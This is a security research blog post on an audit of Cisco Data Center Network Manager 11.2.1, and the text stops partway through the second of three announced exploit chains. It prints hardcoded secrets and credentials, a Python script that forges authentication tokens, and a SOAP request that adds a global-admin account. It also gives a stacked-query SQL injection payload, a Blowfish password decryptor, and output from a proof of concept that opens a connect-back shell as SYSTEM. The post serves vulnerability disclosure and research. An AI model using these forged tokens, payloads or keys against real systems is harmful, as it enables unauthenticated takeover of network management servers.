---
layout: post
title: "Busting Cisco's Beans :: Hardcoding Your Way to Hell"
date: 2020-01-14 09:00:00 -0500
categories: blog
---

![Cisco Networking](/assets/images/busting-ciscos-beans/cisco-logo.png "Cisco Networking")

After the somewhat dismay of reporting to Cisco some [other vulnerabilities](/blog/2019/05/17/panic-at-the-cisco-unauthenticated-rce-in-prime-infrastructure.html) in their Prime Infrastructure product, I decided to perform an audit on the **Cisco Data Center Network Manager (DCNM) product**. What I found should not only **SHOCK** you, but relive that 90's remote root era that you all have been craving.
<!--more-->

TL;DR; *In this post, I share three (3) full exploitation chains and multiple primitives that can be used to compromise different installations and setups of the Cisco DCNM product to achieve unauthenticated remote code execution as SYSTEM/root. In the third chain, I (ab)use the java.lang.InheritableThreadLocal class to perform a shallow copy to gain access to a valid session.*

Before I begin, I would just like to say a huge **THANKYOU** to the [Zero Day Initiative](https://www.zerodayinitiative.com/) and [iDefense VCP Labs](https://vcp.idefense.com/login.jsf). Without their help in disclosing these vulnerabilities, I would have given up long ago.

## Table of Contents

Since this blog post is long I decided to break it up into sections. You can always jump to a particular section and jump back to the TOC.

- [Summary](#summary)
- [Target Versions](#target-versions)
- [RCE Chain 1](#rce-chain-1)
- [RCE Chain 2](#rce-chain-2)
- [RCE Chain 3](#rce-chain-3)
- [SQLi2RCE Primitives](#sqli2rce-primitives)
- [SQLi2FD Primitive](#sqli2fd-primitive)
- [FD2RCE Primitives](#fd2rce-primitives)
- [Conclusions](#conclusions)
- [References](#references)

## Summary

Before testing this application, a total of 14 vulnerabilities had been discovered according to cvedetails. This table doesn't include Pedro's [CVE-2019-1620](https://github.com/pedrib/PoC/blob/master/tracking.csv#L165) and [CVE-2019-1621](https://github.com/pedrib/PoC/blob/master/tracking.csv#L166).

![Total # of publically known vulnerabilities before testing](/assets/images/busting-ciscos-beans/total-vulns.png "Total # of publically known vulnerabilities before testing") 

Below you will find a table of the total number of *exploitable bugs I found in this audit:

| Bug class | Number of findings | Impact |
|:----------|-------------------:|-------:|
| Hardcoded Cryptographic Keys | 3 | AB* |
| Hardcoded Credentials | 1 | ID |
| Traversal File Read | 3 | ID* |
| Arbitrary File Read | 2 | ID* |
| External Enitity Injection | 4 | ID* |
| SQL Injection - Time based blind | 11 | ID* |
| SQL Injection - Stacked queries | 91 | RCE* |
| Arbitrary SQL Execution | 1 | RCE* |
| Command Injection | 2 | RCE* |
| Traversal File Write | 7 | RCE* |
| Traversal File Delete | 8 | DOS |

| Abbreviation | Meaning | Total found |
|:-------------|:--------|------------:|
| AB | Authentication Bypass | 3 |
| RCE | Remote Code Execution | 101 |
| ID | Information Disclosure | 21 |
| DOS | Denial of Service | 8 |

---

- Exploitable meaning developer mistakes and/or my own laziness was not holding me back.
- The AB vulnerabilities were complete (not partial), meaning an attacker could access everything.
- The ID vulnerabilities could have been used to leak credentials and achieve remote code execution.
- The RCE vulnerabilities had complete impact gaining access as either SYSTEM or root.

[ret2toc](#table-of-contents)

## Target Versions

I tested two different setups of the product because some code paths and exploitation techniques were platform specific.

**Cisco DCNM 11.2.1 Installer for Windows (64-bit)**
  - Release: 11.2(1)
  - Release Date: 18-Jun-2019
  - FileName: dcnm-installer-x64-windows.11.2.1.exe.zip
  - Size: 1619.36 MB (1698022100 bytes)
  - MD5 Checksum: e50f8a6b2b3b014ec022fe40fabcb6d5 

```bash
C:\>ver
Microsoft Windows [Version 6.3.9600]
```

**Cisco DCNM 11.2.1 ISO Virtual Appliance for VMWare, KVM and Bare-metal servers**
  - Release: 11.2(1)
  - Release Date: 05-Jun-2019
  - FileName: dcnm-va.11.2.1.iso.zip
  - Size: 4473.54 MB (4690850167 bytes)
  - MD5 Checksum: b1bba467035a8b41c63802ce8666b7bb 

```bash
[root@localhost ~]# uname -a
Linux localhost 3.10.0-957.10.1.el7.x86_64 #1 SMP Mon Mar 18 15:06:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
```

All testing was performed on the latest version at the time.
[ret2toc](#table-of-contents)

## RCE Chain 1

Vulnerable Targets:
- Installer for Windows (dcnm-installer-x64-windows.11.2.1.exe.zip)
- ISO Virtual Appliance for VMWare (dcnm-va.11.2.1.iso.zip)

### SecurityManager getMessageDigest Authentication Bypass Vulnerability

Inside of the `com.cisco.dcbu.jaxws.handler.SecurityHandler` class we see:

```java
/*     */ public class SecurityHandler
/*     */   extends GenericSOAPHandler
/*     */ {
```

This class exposes a method called `handleInbound` which is an interceptor for all SOAP requests.

```java
/*     */   protected boolean handleInbound(MessageContext msgContext) {
/*  76 */     if (logger.isDebugEnabled()) {
/*  77 */       logger.debug("SecurityHandler");
/*     */     }
/*     */ 
/*     */     
/*  81 */     if (WS_LOGGING_ENABLED) {
/*  82 */       saLogCall(msgContext);
/*     */     }
/*     */     
/*     */     try {
/*  86 */       SOAPMessage sm = ((SOAPMessageContext)msgContext).getMessage();
/*  87 */       SOAPHeader header = sm.getSOAPHeader();
/*  88 */       if (header == null)
/*     */       {
/*  90 */         throw new WebServiceException("Unable to authenticate. \nPlease obtain a valid token from Logon Service and specify <m:Token> in the SOAP header.  <SOAP-ENV:Header xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" ><m:Token xmlns:m=\"http://ep.jaxws.dcbu.cisco.com/\">YOUR TOKEN</m:Token></SOAP-ENV:Header>");
/*     */       }
/*     */ 
/*     */       
/*  94 */       if (hasSsoToken(header)) {
/*  95 */         return true;
/*     */       }
/*     */       
/*  98 */       Iterator hItr = header.getChildElements();
/*  99 */       String token = null;
/* 100 */       String sessionId = null;
/* 101 */       while (hItr.hasNext()) {
/* 102 */         Object nxtObj = hItr.next();
/* 103 */         if (nxtObj instanceof javax.xml.soap.Text) {
/*     */           continue;
/*     */         }
/* 106 */         SOAPHeaderElement e = (SOAPHeaderElement)nxtObj;
/* 107 */         String name = e.getElementName().getLocalName();
/* 108 */         if ("Token".equalsIgnoreCase(name)) {
/* 109 */           token = e.getValue();
/*     */           
/* 111 */           if (token == null) {
/* 112 */             Iterator itr = e.getChildElements();
/* 113 */             while (itr.hasNext()) {
/* 114 */               SOAPElement se = (SOAPElement)itr.next();
/* 115 */               token = se.getValue();
/* 116 */               if (token != null) {
/*     */                 break;
/*     */               }
/*     */             } 
/*     */           }
```

The code at line *[94]* we see a call to `SecurityHandler.hasSsoToken` which accepts a SOAP header that we can send in a SOAP request.

```java
/*     */   protected boolean hasSsoToken(SOAPHeader header) {
/* 172 */     if (header == null)
/* 173 */       return false; 
/*     */     try {
/* 175 */       SOAPFactory soapFactory = SOAPFactory.newInstance();
/* 176 */       Iterator itr = header.getChildElements();
/* 177 */       while (itr.hasNext()) {
/* 178 */         Object nxtObj = itr.next();
/* 179 */         if (nxtObj instanceof javax.xml.soap.Text) {
/*     */           continue;
/*     */         }
/* 182 */         SOAPElement e = (SOAPElement)nxtObj;
/* 183 */         if ("ssoToken".equals(e.getElementName().getLocalName())) {
/* 184 */           String sso = e.getValue();
/* 185 */           if (sso != null) {
/* 186 */             boolean valid = SecurityManager.getInstance().confirmSSOToken(sso);
/* 187 */             if (!valid) {
/* 188 */               logger.error("SSO " + sso + " invalid or has expired.");
/*     */             }
/* 190 */             return valid;
/*     */           }
/*     */         
/*     */         } 
/*     */       } 
/* 195 */     } catch (SOAPException e) {
/* 196 */       logger.error("Unable to verify sso: " + e.getMessage());
/*     */     } 
/*     */     
/* 199 */     return false;
/*     */   }
```

The code at line *[183]* will check for a `ssoToken` header and if it exists, extract the value and parse it to `SecurityManager.confirmSSOToken` method on line *[186]*. Let's investigate that method.

```java
/*     */   public static boolean confirmSSOToken(String ssoToken) {
/* 447 */     String userName = null;
/* 448 */     int sessionId = 0;
/* 449 */     long sysTime = 0L;
/* 450 */     String digest = null;
/* 451 */     int count = 0;
/* 452 */     boolean ret = false;
/*     */     
/*     */     try {
/* 455 */       String[] detail = getSSoTokenDetails(ssoToken);
/*     */       
/* 457 */       userName = detail[3];
/* 458 */       sessionId = Integer.parseInt(detail[0]);
/* 459 */       sysTime = (new Long(detail[1])).longValue();
/*     */       
/* 461 */       if (System.currentTimeMillis() - sysTime > 600000L) {
/* 462 */         return ret;
/*     */       }
/* 464 */       digest = detail[2];
/* 465 */       if (digest != null && digest.equals(getMessageDigest("MD5", userName, sessionId, sysTime))) {
/* 466 */         ret = true;
/* 467 */         userNameTLC.set(userName);
/*     */       }
/*     */     
/* 470 */     } catch (Exception ex) {
/* 471 */       _Logger.info("confirmSSoToken: ", ex);
/*     */     } 
/*     */     
/* 474 */     return ret;
/*     */   }
```

We see a check at line *[465]* that if the extracted `digest` matches the resultant call from `SecurityManager.getMessageDigest` then the code will reach line *[466]* and set `ret` to true which is later returned. Let's now investigate the `SecurityManager.getMessageDigest` method.

```java
/*     */   private static String getMessageDigest(String algorithm, String userName, int sessionid, long sysTime) throws Exception {
/* 371 */     String input = userName + sessionid + sysTime + "POsVwv6VBInSOtYQd9r2pFRsSe1cEeVFQuTvDfN7nJ55Qw8fMm5ZGvjmIr87GEF";
/*     */     
/* 373 */     MessageDigest md = MessageDigest.getInstance(algorithm);
/* 374 */     md.update(input.getBytes());
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/* 379 */     return new String(Base64.encodeBase64(md.digest()));
/*     */   }
```

We can see whats happening, we can control all the elements to forge our own token and then a hardcoded key is used to generate the `ssoToken`, meaning that we can bypass authentication. If this looks familiar to you, then you are probably thinking of [CVE-2019-1619](https://github.com/pedrib/PoC/blob/master/advisories/cisco-dcnm-rce.txt#L42) which Pedro found.

Here is the code I used to generate the sso token.

```py
import md5
import base64
def gen_ssotoken():
    timestamp = 9999999999999  # we live forever
    username = "hax"           # doesn't even need to exist!
    sessionid = 1337           # doesn't even need to exist!
    d = "%s%d%dPOsVwv6VBInSOtYQd9r2pFRsSe1cEeVFQuTvDfN7nJ55Qw8fMm5ZGvjmIr87GEF" % (username, sessionid, timestamp)
    return "%d.%d.%s.%s" % (sessionid, timestamp, base64.b64encode(md5.new(d).digest()), username)
```

Using this bug, we can send a SOAP request to the `/DbAdminWSService/DbAdminWS` endpoint and add a global admin user that will give us access to all interfaces!

```xml
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ep="http://ep.san.jaxws.dcbu.cisco.com/">
    <SOAP-ENV:Header xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
        <m:ssoToken xmlns:m="http://ep.jaxws.dcbu.cisco.com/">1337.9999999999999.PxU+ahyOPP9L22+K4u1+6g==.hax</m:ssoToken>
    </SOAP-ENV:Header>
    <soapenv:Body>
        <ep:addUser>
            <userName>hacker</userName>
            <password>Hacked123</password>
            <roleName>global-admin</roleName>
            <enablePwdExpiration>false</enablePwdExpiration>
        </ep:addUser>
    </soapenv:Body>
</soapenv:Envelope>
```

[ret2toc](#table-of-contents)

### HostEnclHandler getVmHostData SQL Injection Remote Code Execution Vulnerability

Inside of the `com.cisco.dcbu.jaxws.san.ep.DbInventoryWS` class we see the following code.

```java
/*      */ @Remote({DbInventorySEI.class})
/*      */ @SOAPBinding(style = SOAPBinding.Style.RPC, use = SOAPBinding.Use.LITERAL)
/*      */ @HandlerChain(file = "../../ep/fms-jaxws-handlers.xml")
/*      */ @WebContext(contextRoot = "/DbInventoryWSService", urlPattern = "/DbInventoryWS")
/*      */ @WebService(name = "DbInventoryWS", serviceName = "DbInventoryService", endpointInterface = "com.cisco.dcbu.jaxws.san.ep.DbInventorySEI")
/*      */ @Stateless
/*      */ public class DbInventoryWS
/*      */   implements DbInventorySEI
/*      */ {
/*      */
/*      */   //...
/*      */
/*      */   @WebMethod(operationName = "getVmHostData")
/*      */   @WebResult(name = "result", partName = "result")
/*      */   public VmDO[] getVmHostData(DbFilterDO dbFilter, int startIdx, int recordSize, boolean isHost) throws SanServiceException {
/*      */     try {
/*  610 */       ArrayList<VmDO> rstList = HostEnclHandler.getInstance().getVmHostData(dbFilter, startIdx, recordSize, isHost, null, null);
/*  611 */       if (rstList.size() < recordSize)
/*  612 */         recordSize = rstList.size(); 
/*  613 */       VmDO[] retEP = new VmDO[recordSize];
/*  614 */       for (int i = 0; i < recordSize; i++) {
/*  615 */         retEP[i] = (VmDO)rstList.get(i);
/*      */       }
/*  617 */       return retEP;
/*  618 */     } catch (Throwable e) {
/*  619 */       logger.warn("DbInventoryWS caught exception in getVmHostData():", e);
/*  620 */       throw new SanServiceException("Cannot get all vm host length in san", e);
/*      */     } 
/*      */   }
```

The annotations at the top of the method indicate that we can reach this method through web services. At line *[610]* we can reach a call to the `HostEnclHandler.getVmHostData` method with an attacker supplied `dbFilter`.

But before we get to that method, let's take a moment to see investigate the `com.cisco.dcbu.jaxws.wo.DbFilterDO` class. This is a Object datatype that the `HostEnclHandler.getVmHostData` method is expecting.

```java
/*     */ @XmlType(name = "DbFilter")
/*     */ @XmlAccessorType(XmlAccessType.FIELD)
/*     */ public class DbFilterDO
/*     */   implements Serializable
/*     */ {
/*     */   private static final long serialVersionUID = 1L;
/*     */   private long fabricDbId;
/*     */   private long switchDbId;
/*     */   private long vsanDbId;
/*     */   private String sortField;
/*     */   private String sortType;
/*     */   private int limit;
/*     */   private long groupId;
/*     */   private boolean isGroup;
/*     */   private String networkType;
/*     */   private String filterStr;
/*     */   private int filterId;
/*     */   private String colFilterStr;
/*     */   private String groupFilterXml;
/*     */   private int dcType;
/*     */   private long navId;
/*     */   private String qryStr;
```

Cisco DCNM uses the [JAXB](https://en.wikipedia.org/wiki/Java_Architecture_for_XML_Binding) marshaller which performs [ORM](https://en.wikipedia.org/wiki/Object-relational_mapping) between XML data structures.

`DbFilterDO` more specifically, is a type of [EJB](https://en.wikipedia.org/wiki/Enterprise_JavaBeans) known as an [entity bean](https://en.wikipedia.org/wiki/Entity_Bean). This bean has a type name of `DbFilter` and it's accessor type is set to `XmlAccessType.FIELD`, meaning that every underlying field and annotated property is marshalled.

Knowing that we can set the fields on this object, let's continue with the `HostEnclHandler.getVmHostData` method definition.

```java
/*      */   public ArrayList<VmDO> getVmHostData(DbFilterDO dbFilter, int startIdx, int recordSize, boolean isHost, Map<Long, String> _vmUsageMap, Map<Long, List<VmDO>> _Host2vmHash) {
/* 1054 */     if (_vmUsageMap == null)
/* 1055 */       _vmUsageMap = new HashMap<Long, String>(); 
/* 1056 */     if (_Host2vmHash == null)
/* 1057 */       _Host2vmHash = new HashMap<Long, List<VmDO>>(); 
/* 1058 */     ArrayList<VmDO> rstList = new ArrayList<VmDO>();
/* 1059 */     String sortSqlSuffix = "";
/* 1060 */     if (!dbFilter.getSortField().equals("Name")) {
/* 1061 */       String sortSql = (String)this._Name2SqlHash.get(dbFilter.getSortField());
/* 1062 */       if (sortSql != null)
/*      */       {
/* 1064 */         sortSqlSuffix = (String)this._Name2SqlHash.get(dbFilter.getSortField()) + dbFilter.getSortType();
/*      */       }
/*      */     } 
```

At line *[1064]* we can see the `sortField` of our `dbFilter` object is accessed and used as an index to the `this._Name2SqlHash` hashmap. Also, the `sortType` is appended afterwards and stores this all in the `sortSqlSuffix` variable.

Let's check the definition of the `this._Name2SqlHash` variable.

```java

/*      */ public class HostEnclHandler
/*      */ {
/*      */
/*      */   // ..
/*      */
/*      */   private Map<String, String> _Name2SqlHash;
/*      */
/*      */   // ...
/*      */
/*      */   public static HostEnclHandler getInstance() {
/*      */
/*      */   // ...
/*      */
/*  101 */     this._Name2SqlHash = new HashMap();
/*  102 */     initSqlSortSuffix();
/*      */   }
/*      */ 
/*      */  // ...
/*      */ 
/*      */   private void initSqlSortSuffix() {
/* 3605 */     this._Name2SqlHash.put("name", " ORDER BY ENC.NAME ");
/* 3606 */     this._Name2SqlHash.put("Name", " ORDER BY ENC.NAME ");
/* 3607 */     this._Name2SqlHash.put("vhostName", " ORDER BY VH.NAME ");
/* 3608 */     this._Name2SqlHash.put("hostTime", " ORDER BY EVT.HOST_TIME ");
/* 3609 */     this._Name2SqlHash.put("vmname", " ORDER BY VHOST.NAME ");
/* 3610 */     this._Name2SqlHash.put("vmcluster", " ORDER BY HC.NAME ");
/* 3611 */     this._Name2SqlHash.put("rxtxStr", " ORDER BY STATS.TOTAL_RXTX ");
/* 3612 */     this._Name2SqlHash.put("vcluster", " ORDER BY HC.NAME ");
/* 3613 */     this._Name2SqlHash.put("ucsSp", " ORDER BY ENC.SERVICE_PROFILE ");
/* 3614 */     this._Name2SqlHash.put("multipath", " ORDER BY VH.MULTIPATH ");
/*      */   }
```

For exploitation, I decided to set the `sortField` to the `vcluster` index on line *[3612]*. This will ensure we don't trigger an `java.lang.IndexOutOfBoundsException` exception on the `this._Name2SqlHash` hashmap.

Continuing along inside of the `HostEnclHandler.getVmHostData` method, we can be sure that we can influence the `sortSqlSuffix` variable.

```java
/* 1068 */     con = null;
/* 1069 */     stmt = null;
/* 1070 */     rs = null;
/* 1071 */     String sql = null;
/*      */     
/*      */     try {
/* 1074 */       con = ConnectionManager.getConnection();
/* 1075 */       processVm(con, _Host2vmHash);
/* 1076 */       processUsageCount(con, _vmUsageMap);
/*      */       
/* 1078 */       sql = SQLLoader.getSqlStmt("HostEnclHandler.VM_HOST_DATA_LIST_STMT");
/* 1079 */       stmt = PersistentHelper.getHelper().getPreparedStmt(con, sql + sortSqlSuffix, 1004, 1007);
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */       
/* 1085 */       rs = SQLLoader.execute(stmt);
```

On line *[1079]* we can see a prepared sql statement is being created in an unsafe way using our injected `sortSqlSuffix` variable. Then on line *[1085]* the sql injection is actually triggered!

*Side note: This bug was a result of a design flaw and patterned numerous times where the developer(s) made the assumption that since the queries where parameterized, they were safe from sql injection. Further searches of this pattern resulted in over 100 separate sql injection vulnerabilities alone.*

The next step was to discover the exact SOAP parameters needed to trigger this code path. The `WebContext` annotation gives us a url pattern that will reveal the [wsdl](https://en.wikipedia.org/wiki/Web_Services_Description_Language) path to be `https://<target>/DbInventoryWSService/DbInventoryWS?wsdl`

For reference, here is the `WebContext` annotation.

```java
/*      */ @WebContext(contextRoot = "/DbInventoryWSService", urlPattern = "/DbInventoryWS")
```

![Revealing the getVmHostData method service descriptor](/assets/images/busting-ciscos-beans/wsdl.png "Revealing the getVmHostData method service descriptor") 

Combining the first vulnerability we could send the following request that populates the properties in the `dbFilter` to the `/DbInventoryWSService/DbInventoryWS` SOAP endpoint and trigger the SQL Injection.

```xml
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ep="http://ep.san.jaxws.dcbu.cisco.com/">
    <SOAP-ENV:Header xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
        <m:ssoToken xmlns:m="http://ep.jaxws.dcbu.cisco.com/">1337.9999999999999.PxU+ahyOPP9L22+K4u1+6g==.hax</m:ssoToken>
    </SOAP-ENV:Header>
    <soapenv:Body>
        <ep:getVmHostData>
            <arg0>
                <sortField>vcluster</sortField>
                <sortType>;select pg_sleep(10);--</sortType>
            </arg0>
            <arg1></arg1>
            <arg2></arg2>
            <arg3></arg3>
        </ep:getVmHostData>
    </soapenv:Body>
</soapenv:Envelope>
```

The SQL Injection is running as user `dcnmuser`.

```bash
root@localhost ~]# psql -U dcnmuser dcmdb
Password for user dcnmuser: 
psql.bin (9.4.5)
Type "help" for help.

dcmdb=> \du dcnmuser
           List of roles
 Role name | Attributes | Member of 
-----------+------------+-----------
 dcnmuser  |            | {}

dcmdb=> select distinct privilege_type FROM information_schema.role_table_grants where grantee=current_user;
 privilege_type 
----------------
 UPDATE
 REFERENCES
 TRIGGER
 INSERT
 SELECT
 DELETE
 TRUNCATE
(7 rows)
```

Checking the database permissions, we can see that we have limited privileges and we can't use commands such as `copy` or `lo_import` to read/write to the filesystem. However, after some investigation, I found several ways to achieve remote code execution. Please see the [SQLi2RCE Primitives](#sqli2rce-primitives) section for details on some of the ways.

```
saturn:~ mr_me$ ./poc.py 
(+) usage: ./poc.py <target> <connectback>
(+) eg: ./poc.py 192.168.100.122 192.168.100.59:1337

saturn:~ mr_me$ ./poc.py 192.168.100.122 192.168.100.59:1337
(+) created the account hacker:Hacked123
(+) created the 1337/custom path!
(+) leaked vfs! temp230cf31722794196/content-ed98b5003b1c695c
(+) SQL Injection working!
(+) wrote the si.jsp shell!
(+) cleaned up the database!
(+) starting handler on port 1337
(+) connection from 192.168.100.122
(+) pop thy shell!
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Program Files\Cisco Systems\dcm\wildfly-10.1.0.Final\bin\service>whoami
whoami
nt authority\system

C:\Program Files\Cisco Systems\dcm\wildfly-10.1.0.Final\bin\service>
```

You can [download](/pocs/cve-2019-15976.py.txt) the exploit and test it for yourself.
[ret2toc](#table-of-contents)

## RCE Chain 2

Vulnerable Targets:
- ISO Virtual Appliance for VMWare (dcnm-va.11.2.1.iso.zip)

### Server Debug Port Hardcoded Account Information Disclosure Vulnerability

Admittedly I don't know where the exact vulnerable code is for this vulnerability, but I will share with you the process of discovery.
When performing some blackbox testing (whilst code reviewing) I came across this web application.

![Authentication for the /serverinfo/ web application](/assets/images/busting-ciscos-beans/serverinfo.png "Authentication for the /serverinfo/ web application")

I didn't know what the password was at the time, so I decided to do some searching, which lead me to [this](https://community.emc.com/docs/DOC-64136) blog post:

![Finding the hardcoded credentials to the /serverinfo/ web application](/assets/images/busting-ciscos-beans/serverinfo-creds.png "Finding the hardcoded credentials to the /serverinfo/ web application")

This worked! I could now login and look around.

![Logging on to the /serverinfo/ web application](/assets/images/busting-ciscos-beans/serverinfo-login.png "Logging on to the /serverinfo/ web application")

The most interesting information disclosure was the `sftp` username and encrypted password, which was only available on the appliance.

![Disclosure of the encrypted sftp password](/assets/images/busting-ciscos-beans/serverinfo-disclosure.png "Disclosure of the encrypted sftp password")

When auditing I bundle all class files and their package paths into a single directory. Searching for the password in this folder returned many results and it was hard to pinpoint exactly which class was at fault. I still have my suspicions on the `com.cisco.dcbu.sm.common.registry.ContextRegistry` class but cross referencing that was a nightmare.

```bash
saturn:all mr_me$ grep -ir "nbv_12345" .
Binary file ./com/cisco/dcbu/sm/server/test/UcsTest.class matches
Binary file ./com/cisco/dcbu/sm/server/test/AuthTest.class matches
Binary file ./com/cisco/dcbu/sm/server/config/ItdConfig.class matches
Binary file ./com/cisco/dcbu/sm/server/security/RadiusAuthenticator.class matches
Binary file ./com/cisco/dcbu/sm/server/web/pmon/PmonHandler.class matches
Binary file ./com/cisco/dcbu/sm/server/zone/PolicyBasedZoning.class matches
Binary file ./com/cisco/dcbu/sm/server/facade/FlexCliImpl.class matches
Binary file ./com/cisco/dcbu/sm/server/CliSession.class matches
Binary file ./com/cisco/dcbu/sm/server/smis/SMISDiscoveryService$1.class matches
Binary file ./com/cisco/dcbu/sm/server/sht/SanHealthService$1.class matches
Binary file ./com/cisco/dcbu/sm/server/alarm/AlarmNotifier.class matches
Binary file ./com/cisco/dcbu/sm/server/event/SMISNotifications.class matches
Binary file ./com/cisco/dcbu/sm/common/security/AAA.class matches
Binary file ./com/cisco/dcbu/sm/common/registry/ContextRegistry.class matches
Binary file ./com/cisco/dcbu/sm/common/event/AbstractEventHandler.class matches
Binary file ./com/cisco/dcbu/sm/common/event/PtoPEventHandler.class matches
Binary file ./com/cisco/dcbu/sm/client/EjbReference.class matches
Binary file ./com/cisco/dcbu/install/model/AAA.class matches
Binary file ./com/cisco/dcbu/install/VCProxy.class matches
Binary file ./com/cisco/dcbu/web/client/util/RestClient.class matches
Binary file ./com/cisco/dcbu/vinci/helper/ConcurrentSearch.class matches
Binary file ./com/cisco/dcbu/lib/upgrade/DbDataUpgrade.class matches
Binary file ./com/cisco/dcbu/lib/snmp/SnmpTrapSession4j$TrapReceiver4j.class matches
Binary file ./com/cisco/dcbu/lib/snmp/SnmpPeer.class matches
Binary file ./com/cisco/dcbu/lib/sshexec/CliTest.class matches
Binary file ./com/cisco/dcbu/lib/mds/zm/CommandHandler.class matches
Binary file ./com/cisco/dcbu/lib/mds/zm/MDSXMLZoneCommandHandler.class matches
Binary file ./com/cisco/dcbu/lib/mds/zm/WebZoneDataModCache.class matches
```

The root password is stored in the `server.properties` file and is displayed in the `/serverinfo/` web application. During installation, the administrator sets the root password and the installer calls `appmgr add_user dcnm -u root -p <password> -db <dcnm-db-password>` which then executes the `/usr/local/cisco/dcm/fm/bin/addUser.sh` script.

The `/usr/local/cisco/dcm/fm/bin/addUser.sh` script launches the `com.cisco.dcbu.install.UserUtil` class to add that user to the `server.properties` file.

We are left with one small hurdle, *how are we going to decrypt the password?*
[ret2toc](#table-of-contents)

### JBoss_4_2Encrypter Hardcoded Encryption Key Information Disclosure Vulnerability

Inside of the `com.cisco.dcbu.lib.util.jboss_4_2.JBoss_4_2Encrypter` class, we can find the following code:

```java
/*    */ public class JBoss_4_2Encrypter
/*    */ {
/*    */   public static String encrypt(String plainTextKey) throws Exception {
/* 39 */     byte[] keyBytes = "jaas is the way".getBytes();
/*    */     
/* 41 */     Cipher blowFishCipher = Cipher.getInstance("Blowfish");
/* 42 */     blowFishCipher.init(1, new SecretKeySpec(keyBytes, "Blowfish"));
/*    */     
/* 44 */     BigInteger integer = new BigInteger(blowFishCipher.doFinal(plainTextKey.getBytes()));
/* 45 */     return integer.toString(16);
/*    */   }
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */   
/*    */   public static String decrypt(String encryptedKey) throws Exception {
/* 55 */     if (encryptedKey.startsWith("#")) {
/* 56 */       encryptedKey = encryptedKey.substring(1);
/*    */     }
/*    */ 
/*    */     
/* 60 */     BigInteger bInt = new BigInteger(encryptedKey, 16);
/*    */ 
/*    */     
/* 63 */     Cipher blowFishCipher = Cipher.getInstance("Blowfish");
/* 64 */     blowFishCipher.init(2, new SecretKeySpec("jaas is the way".getBytes(), "Blowfish"));
/*    */     
/* 66 */     return new String(blowFishCipher.doFinal(bInt.toByteArray()));
/*    */   }
/*    */ }
```

On line *[39]* the code encrypts these passwords using the `jaas is the way` key. Yes, Cisco, jaas is the way.

```py
#!/usr/bin/python
import sys
from Crypto.Cipher import Blowfish
cipher = Blowfish.new("jaas is the way", Blowfish.MODE_ECB)
print cipher.decrypt(sys.argv[1].decode("hex"))
```

```bash
saturn:~ mr_me$ ./poc.py 59f44e08047be2d72f34371127b18a0b
Dcnmpass123
```

With this, we can now login to the DCNM web interface as the root user with `network-admin` privileges, which is enough for a complete authentication bypass.
We can also login to the SSH server as root but we don't talk about that default misconfiguration and instead assume the SSH server is locked down. :-)
[ret2toc](#table-of-contents)

### LanFabricImpl createLanFabric Command Injection Remote Code Execution Vulnerability

Inside of the `com.cisco.dcbu.vinci.rest.services.LanFabrics` class we can find the `createLanFabric` rest method.

```java
/*     */ @Path("/fabrics")
/*     */ public class LanFabrics
/*     */ {
/*  42 */   private final Logger log = LogManager.getLogger("fabrics");
/*     */   
/*     */   @POST
/*     */   @Consumes({"application/json"})
/*     */   @Produces({"application/json"})
/*     */   @Mapped
/*     */   public Response createLanFabric(@RequestBody LanFabricSetting fabric) {
/*  49 */     StatusCode res = StatusCode.ProcessingError;
/*  50 */     String errorHeading = "Creating LAN fabric fails. ";
/*  51 */     LanFabricSetting setting = null;
/*     */     try {
/*  53 */       LanFabricImpl impl = new LanFabricImpl();
/*  54 */       res = impl.createLanFabric(fabric);
/*  55 */       if (res == StatusCode.Success) {
/*     */         
/*  57 */         setting = new LanFabricSetting();
/*  58 */         setting.setName(fabric.getName());
/*     */       } 
/*  60 */     } catch (Exception e) {
/*  61 */       e.printStackTrace();
/*  62 */       errorHeading = errorHeading + " " + e.getMessage();
/*     */     } 
/*  64 */     return RestHelper.composeHttpResponse(res, setting, errorHeading, this.log);
/*     */   }
```

At line *[54]* we can call the `LanFabricImpl.createLanFabric` method with a controlled `com.cisco.dcbu.vinci.rest.resources.fabric.LanFabricSetting` entity bean called `fabric`.

```java
/*     */ @JsonIgnoreProperties(ignoreUnknown = true)
/*     */ @JsonInclude(JsonInclude.Include.NON_DEFAULT)
/*     */ public class LanFabricSetting
/*     */   implements Cloneable
/*     */ {
/*     */   private String name;
/*     */   private String description;
/*     */   private GeneralSetting generalSetting;
/*     */   private ProvisionSetting provisionSetting;
/*     */   private PoolSetting poolSetting;
/*     */   private BorderSetting borderSetting;
```

This entity bean contains several nested entity beans of type `GeneralSetting`, `ProvisionSetting`, `PoolSetting` and `BorderSetting`. We will need to setup the data structures correctly if we want to reach certain parts of the code.

```java
/*      */   public StatusCode createLanFabric(LanFabricSetting fabric) {
/*  135 */     if (!RBACUserImpl.getInstance().hasFullAccess(-1L)) {
/*  136 */       return StatusCode.UserUnauthorized;
/*      */     }
/*  138 */     StatusCode ret = StatusCode.InvalidRequest;
/*      */     
/*  140 */     String fabricName = (fabric != null) ? fabric.getName() : null;
/*  141 */     if (RestHelper.isEmpty(fabricName)) {
/*  142 */       ret.setExtra("Required LAN fabric name is not specified.");
/*  143 */       RestHelper.logMesasge(this.log, ret, "Impl: Created LAN fabric ");
/*  144 */       return ret;
/*      */     } 
/*      */     
/*      */     try {
/*  148 */       validateSegmentAndPartitionRanges(fabric, ret);
/*  149 */       ret = fabric.validate();
```

In order to continue execution, the `fabric` entity bean needs to survive the checks on lines *[148-149]*. The most important is the `fabric.validate` method call which contains multiple checks for property values.

```java
/*     */   public StatusCode validate() {
